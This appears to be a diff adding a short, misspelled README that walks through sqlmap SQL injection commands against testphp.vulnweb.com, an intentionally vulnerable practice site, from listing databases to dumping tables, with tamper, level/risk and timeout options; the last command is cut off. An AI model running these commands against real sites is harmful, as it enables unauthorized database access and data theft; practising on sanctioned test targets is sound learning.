@@ -1,0 +1,31 @@
+first do this in cmd if you are using windows this repo is for windows devices so first you have to run:
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs
+then you can see if it was sucsesfull if it was then you can run this:
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+after that you should see al of the tables then run this and if you'd like to dive deeper into specific tables, use:
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T <table_name> --columns
+then run this:
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T <table_name> --dump
+and then there is diffrent kinds of thegniques example these ones:
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T <table_name> --dump --tamper=space2comment
+3. Different Injection Type:
+If the basic dump command didn’t work, you can try using different injection types or higher levels of testing. Example with --level=5 --risk=3 (which increases the number of tests sqlmap will try):
+
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T <table_name> --dump --level=5 --risk=3
+4. Query Timeout:
+Sometimes, large databases or complex queries can time out. If you get timeouts, you could try increasing the timeout limit with --timeout or use --delay to introduce a small delay between requests to avoid being blocked.
+
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T <table_name> --dump --timeout=30
+5. Valid Table Name:
+Double-check that the table name exists and is correct. You can list the tables again with:
+
+
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --tables
+6. Verbose Mode:
+For more insight into what’s going wrong, you can use the --verbose=3 flag to see more detailed output from sqlmap:
+
+
+python sqlmap.py -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T <table_name
+
+
+
